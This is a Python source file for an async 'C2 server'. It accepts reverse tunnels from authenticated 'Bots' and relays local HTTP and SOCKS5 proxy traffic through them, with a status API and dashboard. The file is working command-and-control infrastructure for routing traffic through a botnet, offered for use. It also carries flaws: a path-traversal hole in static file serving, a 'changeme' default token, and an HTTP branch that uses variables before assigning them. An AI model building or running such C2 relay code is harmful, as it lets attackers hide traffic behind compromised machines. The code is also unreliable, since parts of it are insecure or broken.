#!/usr/bin/env python3
"""
c2_server.py

Async C2 server:
- Accept reverse Bot tunnels over TLS/TCP
- Accept local clients on HTTP proxy (8080) and SOCKS5 (1080)
- Multiplex traffic using framed protocol
- Round-robin load balancing across Bots
"""

import asyncio
import ssl
import logging
import uuid
import json
import os
import signal
import sys
import time
from typing import Dict, Tuple, Optional

from core.protocol import Frame, FramedStream, Heartbeat
from core.utils.config import load_config, validate_config
from core.utils.logging import setup_logging, get_logger
from features.monitoring.health_check import HealthChecker
from features.monitoring.web_dashboard import WebDashboard


logger = get_logger("c2")


class BotSession:
    def __init__(self, bot_id: str, stream: FramedStream, config: dict):
        self.bot_id = bot_id
        self.stream = stream
        # Use config values for heartbeat
        heartbeat_interval = config.get("heartbeat", {}).get("interval", 30)
        heartbeat_timeout = config.get("heartbeat", {}).get("timeout", 90)
        self.heartbeat = Heartbeat(stream, interval=heartbeat_interval, timeout=heartbeat_timeout, name=f"bot-{bot_id}")
        # Map request_id -> (reader, writer) for client connections routed via this bot
        self.active: Dict[str, asyncio.StreamWriter] = {}

    async def start(self):
        await self.heartbeat.start()


class C2Server:
    def __init__(self, config_file: str = "config.json"):
        self.config = self._load_config(config_file)
        self.host = self.config["server"]["host"]
        self.bot_port = self.config["server"]["bot_port"]
        self.http_port = self.config["server"]["http_port"]
        self.socks_port = self.config["server"]["socks_port"]
        self.api_port = self.config["server"]["api_port"]
        self.bot_token = self.config["security"]["bot_token"]
        self.ssl_ctx: Optional[ssl.SSLContext] = None
        
        # Setup TLS if enabled
        if self.config["security"]["tls"]["enabled"]:
            cert_file = self.config["security"]["tls"]["cert_file"]
            key_file = self.config["security"]["tls"]["key_file"]
            if os.path.exists(cert_file) and os.path.exists(key_file):
                ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
                self.ssl_ctx = ctx
                logger.info("TLS enabled with cert: %s, key: %s", cert_file, key_file)
            else:
                logger.warning("TLS enabled but cert/key files not found: %s, %s", cert_file, key_file)
        
        # Setup logging
        log_level = getattr(logging, self.config["logging"]["level"].upper(), logging.INFO)
        logging.basicConfig(level=log_level, format=self.config["logging"]["format"])
        
        self.bots: Dict[str, BotSession] = {}
        self._rr_keys = []
        self._rr_idx = 0
        self.preferred_bot: Optional[str] = None
        
        # Network settings from config
        self.buffer_size = self.config["network"]["buffer_size"]
        self.read_timeout = self.config["network"]["read_timeout"]
        self.write_timeout = self.config["network"]["write_timeout"]
        self.connect_timeout = self.config["network"]["connect_timeout"]
        
        # Shutdown handling
        self._shutdown_event = asyncio.Event()
        self._servers = []
        self._tasks = []
        
        # Connection limits
        self.max_bots = self.config["limits"]["max_bots"]
        self.max_connections_per_bot = self.config["limits"]["max_connections_per_bot"]
        self.connection_timeout = self.config["limits"]["connection_timeout"]
        
        # Connection tracking
        self._total_connections = 0
        self._connection_counts = {}  # bot_id -> count
        
        # Health check tracking
        self._start_time = time.time()
        self._last_health_check = time.time()
        self._health_status = "healthy"

    def _load_config(self, config_file: str) -> dict:
        """Load configuration from JSON file with fallback to defaults."""
        default_config = {
            "server": {
                "host": "0.0.0.0",
                "bot_port": 4443,
                "http_port": 8080,
                "socks_port": 1080,
                "api_port": 5001
            },
            "security": {
                "bot_token": "changeme",
                "tls": {
                    "enabled": False,
                    "cert_file": "cert.pem",
                    "key_file": "key.pem"
                }
            },
            "logging": {
                "level": "INFO",
                "format": "[%(asctime)s] %(levelname)s %(name)s: %(message)s"
            },
            "limits": {
                "max_bots": 100,
                "max_connections_per_bot": 50,
                "connection_timeout": 300
            },
            "heartbeat": {
                "interval": 30,
                "timeout": 90
            },
            "network": {
                "buffer_size": 4096,
                "read_timeout": 30,
                "write_timeout": 30,
                "connect_timeout": 10
            }
        }
        
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                logger.info("Loaded config from %s", config_file)
                return config
            else:
                logger.warning("Config file %s not found, using defaults", config_file)
                return default_config
        except (json.JSONDecodeError, KeyError) as e:
            logger.error("Invalid config file %s: %s, using defaults", config_file, e)
            return default_config
        except Exception as e:
            logger.error("Error loading config %s: %s, using defaults", config_file, e)
            return default_config

    def _next_bot(self) -> Optional[BotSession]:
        if not self.bots:
            return None
        if self.preferred_bot and self.preferred_bot in self.bots:
            return self.bots[self.preferred_bot]
        if not self._rr_keys:
            self._rr_keys = list(self.bots.keys())
            self._rr_idx = 0
        bot_id = self._rr_keys[self._rr_idx % len(self._rr_keys)]
        self._rr_idx += 1
        return self.bots.get(bot_id)

    def _can_accept_bot(self) -> bool:
        """Check if we can accept a new bot connection."""
        return len(self.bots) < self.max_bots

    def _can_accept_connection(self, bot_id: str) -> bool:
        """Check if a bot can accept a new connection."""
        if bot_id not in self.bots:
            return False
        current_count = self._connection_counts.get(bot_id, 0)
        return current_count < self.max_connections_per_bot

    def _increment_connection_count(self, bot_id: str) -> bool:
        """Increment connection count for a bot. Returns True if successful."""
        if not self._can_accept_connection(bot_id):
            return False
        self._connection_counts[bot_id] = self._connection_counts.get(bot_id, 0) + 1
        self._total_connections += 1
        return True

    def _decrement_connection_count(self, bot_id: str):
        """Decrement connection count for a bot."""
        if bot_id in self._connection_counts:
            self._connection_counts[bot_id] = max(0, self._connection_counts[bot_id] - 1)
            self._total_connections = max(0, self._total_connections - 1)
            if self._connection_counts[bot_id] == 0:
                del self._connection_counts[bot_id]

    def _get_connection_stats(self) -> dict:
        """Get current connection statistics."""
        return {
            "total_connections": self._total_connections,
            "max_bots": self.max_bots,
            "current_bots": len(self.bots),
            "max_connections_per_bot": self.max_connections_per_bot,
            "bot_connections": dict(self._connection_counts)
        }

    def _get_health_status(self) -> dict:
        """Get comprehensive health status."""
        current_time = time.time()
        uptime = current_time - self._start_time
        
        # Check if we have any bots
        has_bots = len(self.bots) > 0
        
        # Check if any bots are overloaded
        overloaded_bots = 0
        for bot_id, count in self._connection_counts.items():
            if count >= self.max_connections_per_bot:
                overloaded_bots += 1
        
        # Determine overall health status
        if not has_bots:
            health_status = "degraded"
            health_message = "No bots connected"
        elif overloaded_bots > 0:
            health_status = "warning"
            health_message = f"{overloaded_bots} bots overloaded"
        elif len(self.bots) >= self.max_bots * 0.9:  # 90% of max bots
            health_status = "warning"
            health_message = "Approaching bot limit"
        else:
            health_status = "healthy"
            health_message = "All systems operational"
        
        # Update internal health status
        self._health_status = health_status
        self._last_health_check = current_time
        
        return {
            "status": health_status,
            "message": health_message,
            "timestamp": current_time,
            "uptime_seconds": uptime,
            "uptime_human": self._format_uptime(uptime),
            "bots": {
                "total": len(self.bots),
                "max": self.max_bots,
                "overloaded": overloaded_bots,
                "list": list(self.bots.keys())
            },
            "connections": {
                "total": self._total_connections,
                "max_per_bot": self.max_connections_per_bot,
                "per_bot": dict(self._connection_counts)
            },
            "servers": {
                "bot_port": self.bot_port,
                "http_port": self.http_port,
                "socks_port": self.socks_port,
                "api_port": self.api_port
            }
        }

    def _format_uptime(self, seconds: float) -> str:
        """Format uptime in human readable format."""
        days = int(seconds // 86400)
        hours = int((seconds % 86400) // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        
        if days > 0:
            return f"{days}d {hours}h {minutes}m {secs}s"
        elif hours > 0:
            return f"{hours}h {minutes}m {secs}s"
        elif minutes > 0:
            return f"{minutes}m {secs}s"
        else:
            return f"{secs}s"

    async def serve(self):
        """Start the C2 server with graceful shutdown support."""
        # Setup signal handlers
        self._setup_signal_handlers()
        
        # Start servers
        bot_server = await asyncio.start_server(self._handle_bot, self.host, self.bot_port, ssl=self.ssl_ctx)
        http_server = await asyncio.start_server(self._handle_http_client, self.host, self.http_port)
        socks_server = await asyncio.start_server(self._handle_socks_client, self.host, self.socks_port)
        api_server = await asyncio.start_server(self._handle_api_client, self.host, self.api_port)
        
        self._servers = [bot_server, http_server, socks_server, api_server]
        
        addrs = ", ".join(str(s.getsockname()) for s in bot_server.sockets)
        logger.info("C2 listening for bots on %s", addrs)
        logger.info("HTTP proxy on %s:%d", self.host, self.http_port)
        logger.info("SOCKS5 proxy on %s:%d", self.host, self.socks_port)
        logger.info("Web API on %s:%d", self.host, self.api_port)
        logger.info("Press Ctrl+C to shutdown gracefully")
        
        try:
            # Start all servers
            server_tasks = [
                asyncio.create_task(server.serve_forever(), name=f"server-{i}")
                for i, server in enumerate(self._servers)
            ]
            self._tasks.extend(server_tasks)
            
            # Wait for shutdown signal
            await self._shutdown_event.wait()
            
        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt")
        except Exception as e:
            logger.error("Server error: %s", e)
        finally:
            await self._cleanup()

    def _setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown."""
        def signal_handler(signum, frame):
            logger.info("Received signal %d, initiating graceful shutdown...", signum)
            self._shutdown_event.set()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # On Windows, also handle SIGBREAK
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, signal_handler)

    async def _cleanup(self):
        """Cleanup resources during shutdown."""
        logger.info("Starting cleanup...")
        
        # Cancel all tasks
        for task in self._tasks:
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        
        # Close all servers
        for server in self._servers:
            server.close()
            await server.wait_closed()
        
        # Close all bot connections
        for bot_id, session in list(self.bots.items()):
            logger.info("Closing bot connection: %s", bot_id)
            try:
                if session.heartbeat:
                    await session.heartbeat.stop()
                session.stream.close()
            except Exception as e:
                logger.warning("Error closing bot %s: %s", bot_id, e)
        
        self.bots.clear()
        logger.info("Cleanup completed")

    async def _handle_bot(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        stream = FramedStream(reader, writer)
        logger.info("Bot connected from %s", peer)
        
        # Check bot limit before authentication
        if not self._can_accept_bot():
            logger.warning("Bot limit exceeded (%d/%d), rejecting connection from %s", 
                         len(self.bots), self.max_bots, peer)
            await stream.send(Frame(type="ERR", meta={"reason": "bot_limit_exceeded"}))
            stream.close()
            return
        
        # Expect AUTH
        auth = await stream.recv(timeout=10)
        if not auth or auth.type != "AUTH" or not auth.meta or auth.meta.get("token") != self.bot_token:
            logger.warning("Bot auth failed from %s", peer)
            await stream.send(Frame(type="ERR", meta={"reason": "auth_failed"}))
            stream.close()
            return
        
        bot_id = auth.meta.get("bot_id") or str(peer)
        
        # Check if bot already exists (reconnection)
        if bot_id in self.bots:
            logger.info("Bot %s reconnecting, closing old connection", bot_id)
            old_session = self.bots[bot_id]
            if old_session.heartbeat:
                await old_session.heartbeat.stop()
            old_session.stream.close()
        
        session = BotSession(bot_id, stream, self.config)
        self.bots[bot_id] = session
        self._rr_keys = list(self.bots.keys())
        await session.start()
        await stream.send(Frame(type="OK", meta={"msg": "AUTH_OK"}))
        logger.info("Bot %s authenticated successfully", bot_id)
        try:
            while True:
                frame = await stream.recv()
                if frame is None:
                    break
                # Heartbeat
                if await session.heartbeat.handle_rx(frame):
                    continue
                if frame.type == "PROXY_RESPONSE" or frame.type == "DATA":
                    req_id = frame.request_id
                    if not req_id:
                        continue
                    info = session.active.get(req_id)
                    if info and frame.payload:
                        try:
                            w = info.get("writer")
                            if w:
                                w.write(frame.payload)
                                await w.drain()
                        except (ConnectionResetError, BrokenPipeError, OSError) as e:
                            logger.warning("client write error: %s", e)
                        except Exception as e:
                            logger.error("unexpected client write error: %s", e)
                elif frame.type == "END":
                    req_id = frame.request_id
                    info = session.active.pop(req_id, None)
                    if info:
                        # Decrement connection count
                        self._decrement_connection_count(bot_id)
                        try:
                            w = info.get("writer")
                            if w:
                                w.close()
                        except (ConnectionResetError, BrokenPipeError, OSError) as e:
                            logger.debug("client close error: %s", e)
                        except Exception as e:
                            logger.warning("unexpected client close error: %s", e)
                else:
                    logger.debug("unhandled bot frame: %s", frame.type)
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            logger.warning("bot session connection error: %s", e)
        except asyncio.CancelledError:
            logger.info("bot session cancelled: %s", bot_id)
            raise
        except Exception as e:
            logger.error("unexpected bot session error: %s", e)
        finally:
            logger.info("Bot disconnected: %s", bot_id)
            # Cleanup connection counts
            if bot_id in self._connection_counts:
                self._total_connections -= self._connection_counts[bot_id]
                del self._connection_counts[bot_id]
            self.bots.pop(bot_id, None)
            self._rr_keys = list(self.bots.keys())
            stream.close()

    async def _handle_http_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        bot = self._next_bot()
        if not bot:
            logger.warning("No available bots for HTTP request from %s", peer)
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return
        
        # Check connection limit for the selected bot
        if not self._can_accept_connection(bot.bot_id):
            logger.warning("Bot %s connection limit exceeded (%d/%d), rejecting HTTP request from %s", 
                         bot.bot_id, self._connection_counts.get(bot.bot_id, 0), 
                         self.max_connections_per_bot, peer)
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return
        # Peek request with timeout
        try:
            req = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
        except asyncio.TimeoutError:
            logger.warning("HTTP client read timeout from %s", peer)
            writer.close()
            return
        if not req:
            writer.close();
            return
        # naive parse
        first = req.split(b"\r\n", 1)[0]
        is_connect = first.startswith(b"CONNECT ")
        req_id = str(uuid.uuid4())
        bot.active[req_id] = writer
        if is_connect:
            # CONNECT host:port HTTP/1.1
            try:
                hostport = first.split()[1].decode()
                host, port = hostport.split(":", 1)
                port = int(port)
            except (ValueError, IndexError) as e:
                logger.warning("invalid host:port format: %s", e)
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            except Exception as e:
                logger.error("unexpected host parsing error: %s", e)
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            # Tell client tunnel is established
            writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n"); await writer.drain()
        # Increment connection count
        if not self._increment_connection_count(bot.bot_id):
            logger.warning("Failed to increment connection count for bot %s", bot.bot_id)
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            await writer.drain()
            writer.close()
            return
        
        # Request bot to open upstream
        await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
        # Track connection meta
        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
        
        # Handle HTTP over tunnel
        if first.startswith(b"GET") or first.startswith(b"POST") or first.startswith(b"PUT") or first.startswith(b"DELETE"):
            # Extract Host header
            host, port = None, 80
            for line in req.split(b"\r\n"):
                if line.lower().startswith(b"host:"):
                    hp = line.split(b":", 1)[1].strip().decode()
                    if ":" in hp:
                        host, port = hp.split(":", 1)
                        host, port = host.strip(), int(port)
                    else:
                        host = hp
                    break
            if not host:
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))
            await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=req))
            bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}

        # Pipe client->bot
        async def pump_client():
            try:
                while True:
                    chunk = await reader.read(self.buffer_size)
                    if not chunk:
                        break
                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
            finally:
                await bot.stream.send(Frame(type="END", request_id=req_id))

        asyncio.create_task(pump_client(), name=f"pump-client-{req_id}")

    async def _handle_socks_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        # Minimal SOCKS5 CONNECT support
        peer = writer.get_extra_info("peername")
        bot = self._next_bot()
        if not bot:
            logger.warning("No available bots for SOCKS request from %s", peer)
            writer.close(); return
        
        # Check connection limit for the selected bot
        if not self._can_accept_connection(bot.bot_id):
            logger.warning("Bot %s connection limit exceeded (%d/%d), rejecting SOCKS request from %s", 
                         bot.bot_id, self._connection_counts.get(bot.bot_id, 0), 
                         self.max_connections_per_bot, peer)
            writer.close()
            return
        data = await reader.readexactly(2)
        nmethods = data[1]
        await reader.readexactly(nmethods)  # methods
        writer.write(b"\x05\x00"); await writer.drain()
        req = await reader.readexactly(4)
        if req[1] != 1:  # not CONNECT
            writer.close(); return
        atyp = req[3]
        if atyp == 1:  # IPv4
            host = ".".join(map(str, (await reader.readexactly(4))))
        elif atyp == 3:  # domain
            ln = (await reader.readexactly(1))[0]
            host = (await reader.readexactly(ln)).decode()
        else:
            writer.close(); return
        port = int.from_bytes(await reader.readexactly(2), "big")
        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"); await writer.drain()
        req_id = str(uuid.uuid4())
        
        # Increment connection count
        if not self._increment_connection_count(bot.bot_id):
            logger.warning("Failed to increment connection count for bot %s", bot.bot_id)
            writer.close()
            return
        
        bot.active[req_id] = {"writer": writer, "host": host, "port": port, "client": peer}
        await bot.stream.send(Frame(type="PROXY_REQUEST", request_id=req_id, meta={"host": host, "port": port}))

        async def pump_client():
            try:
                while True:
                    chunk = await reader.read(self.buffer_size)
                    if not chunk:
                        break
                    await bot.stream.send(Frame(type="DATA", request_id=req_id, payload=chunk))
            finally:
                await bot.stream.send(Frame(type="END", request_id=req_id))

        asyncio.create_task(pump_client(), name=f"pump-socks-{req_id}")

    async def _handle_api_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        peer = writer.get_extra_info("peername")
        try:
            try:
                data = await asyncio.wait_for(reader.read(self.buffer_size), timeout=self.read_timeout)
            except asyncio.TimeoutError:
                logger.warning("API client read timeout from %s", peer)
                writer.close()
                return
            if not data:
                writer.close(); return
            text = data.decode(errors="ignore")
            line = text.split("\r\n", 1)[0]
            parts = line.split()
            if len(parts) < 2:
                writer.write(b"HTTP/1.1 400 Bad Request\r\n\r\n"); await writer.drain(); writer.close(); return
            method, path = parts[0], parts[1]

            def json_response(obj: dict, status: str = "200 OK"):
                import json
                body = json.dumps(obj, default=str).encode()
                hdr = (
                    f"HTTP/1.1 {status}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Access-Control-Allow-Origin: *\r\n\r\n"
                ).encode()
                writer.write(hdr + body)

            if method == "GET" and path == "/api/status":
                stats = self._get_connection_stats()
                resp = {
                    "host": self.host,
                    "ports": {"bot": self.bot_port, "http": self.http_port, "socks": self.socks_port, "api": self.api_port},
                    "bots": list(self.bots.keys()),
                    "preferred_bot": self.preferred_bot,
                    "bot_count": len(self.bots),
                    "active_connections": stats["total_connections"],
                    "connection_limits": {
                        "max_bots": stats["max_bots"],
                        "max_connections_per_bot": stats["max_connections_per_bot"],
                        "current_bots": stats["current_bots"]
                    },
                    "bot_connections": stats["bot_connections"]
                }
                json_response(resp)
            elif method == "GET" and path == "/api/bots":
                bots = []
                for bid, sess in self.bots.items():
                    bots.append({
                        "bot_id": bid,
                        "active_requests": len(sess.active),
                    })
                json_response({"bots": bots})
            elif method == "GET" and path == "/api/connections":
                conns = []
                for bid, sess in self.bots.items():
                    for rid, info in sess.active.items():
                        conns.append({
                            "request_id": rid,
                            "bot_id": bid,
                            "target": f"{info.get('host')}:{info.get('port')}",
                            "client": info.get('client'),
                        })
                json_response({"connections": conns})
            elif method == "POST" and path == "/api/select_bot":
                # very simple body parse
                body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
                import json
                try:
                    payload = json.loads(body or "{}")
                    bid = payload.get("bot_id")
                except (json.JSONDecodeError, UnicodeDecodeError) as e:
                    logger.warning("invalid JSON in request body: %s", e)
                    bid = None
                except Exception as e:
                    logger.error("unexpected JSON parsing error: %s", e)
                    bid = None
                if bid and bid in self.bots:
                    self.preferred_bot = bid
                    json_response({"ok": True, "preferred_bot": bid})
                else:
                    json_response({"ok": False, "error": "invalid_bot"}, status="400 Bad Request")
            elif method == "POST" and path == "/api/clear_preferred_bot":
                self.preferred_bot = None
                json_response({"ok": True})
            elif method == "GET" and path == "/health":
                # Simple health check endpoint
                health = self._get_health_status()
                if health["status"] == "healthy":
                    json_response(health, status="200 OK")
                elif health["status"] == "warning":
                    json_response(health, status="200 OK")
                else:  # degraded
                    json_response(health, status="503 Service Unavailable")
            elif method == "GET" and path == "/health/detailed":
                # Detailed health check endpoint
                health = self._get_health_status()
                json_response(health, status="200 OK")
            elif method == "GET" and path == "/health/ready":
                # Kubernetes readiness probe
                if len(self.bots) > 0:
                    json_response({"status": "ready", "bots": len(self.bots)}, status="200 OK")
                else:
                    json_response({"status": "not_ready", "bots": 0}, status="503 Service Unavailable")
            elif method == "GET" and path == "/health/live":
                # Kubernetes liveness probe
                json_response({"status": "alive", "uptime": time.time() - self._start_time}, status="200 OK")
            else:
                # static files
                if path == "/" or path == "/index.html":
                    # Serve dashboard.html
                    try:
                        with open("templates/dashboard.html", "r", encoding="utf-8") as f:
                            body = f.read().encode()
                        hdr = (
                            f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {len(body)}\r\n\r\n"
                        ).encode()
                        writer.write(hdr + body)
                    except FileNotFoundError:
                        writer.write(b"HTTP/1.1 404 Not Found\r\n\r\nDashboard template not found")
                elif path.startswith("/static/"):
                    # Serve static files (JS, CSS, etc.)
                    file_path = path[1:]  # Remove leading /
                    try:
                        with open(file_path, "rb") as f:
                            body = f.read()
                        content_type = "application/javascript" if file_path.endswith(".js") else "text/css"
                        hdr = (
                            f"HTTP/1.1 200 OK\r\nContent-Type: {content_type}\r\nContent-Length: {len(body)}\r\n\r\n"
                        ).encode()
                        writer.write(hdr + body)
                    except FileNotFoundError:
                        writer.write(b"HTTP/1.1 404 Not Found\r\n\r\nStatic file not found")
                else:
                    writer.write(b"HTTP/1.1 404 Not Found\r\n\r\n")
        except Exception as e:
            try:
                writer.write(b"HTTP/1.1 500 Internal Server Error\r\n\r\n")
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug("error response write failed: %s", e)
            except Exception as e:
                logger.warning("unexpected error response write error: %s", e)
            logger.warning("api error: %s", e)
        finally:
            try:
                await writer.drain()
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug("error response drain failed: %s", e)
            except Exception as e:
                logger.warning("unexpected error response drain error: %s", e)
            try:
                writer.close()
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                logger.debug("error response close failed: %s", e)
            except Exception as e:
                logger.warning("unexpected error response close error: %s", e)


async def main():
    import argparse
    p = argparse.ArgumentParser(description="C2 Server with config file support")
    p.add_argument("--config", default="config.json", help="Config file path (default: config.json)")
    p.add_argument("--host", help="Override server host")
    p.add_argument("--bot-port", type=int, help="Override bot port")
    p.add_argument("--http-port", type=int, help="Override HTTP proxy port")
    p.add_argument("--socks-port", type=int, help="Override SOCKS5 proxy port")
    p.add_argument("--api-port", type=int, help="Override API port")
    p.add_argument("--bot-token", help="Override bot token")
    p.add_argument("--tls-enabled", action="store_true", help="Enable TLS")
    p.add_argument("--certfile", help="TLS certificate file")
    p.add_argument("--keyfile", help="TLS private key file")
    args = p.parse_args()

    # Load server with config file
    server = C2Server(args.config)
    
    # Override with command line arguments if provided
    if args.host:
        server.host = args.host
    if args.bot_port:
        server.bot_port = args.bot_port
    if args.http_port:
        server.http_port = args.http_port
    if args.socks_port:
        server.socks_port = args.socks_port
    if args.api_port:
        server.api_port = args.api_port
    if args.bot_token:
        server.bot_token = args.bot_token
    if args.tls_enabled:
        server.config["security"]["tls"]["enabled"] = True
    if args.certfile:
        server.config["security"]["tls"]["cert_file"] = args.certfile
    if args.keyfile:
        server.config["security"]["tls"]["key_file"] = args.keyfile
    
    # Re-setup TLS if overridden
    if server.config["security"]["tls"]["enabled"]:
        cert_file = server.config["security"]["tls"]["cert_file"]
        key_file = server.config["security"]["tls"]["key_file"]
        if os.path.exists(cert_file) and os.path.exists(key_file):
            ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
            server.ssl_ctx = ctx
            logger.info("TLS enabled with cert: %s, key: %s", cert_file, key_file)
        else:
            logger.warning("TLS enabled but cert/key files not found: %s, %s", cert_file, key_file)
    
    await server.serve()


if __name__ == "__main__":
    asyncio.run(main())


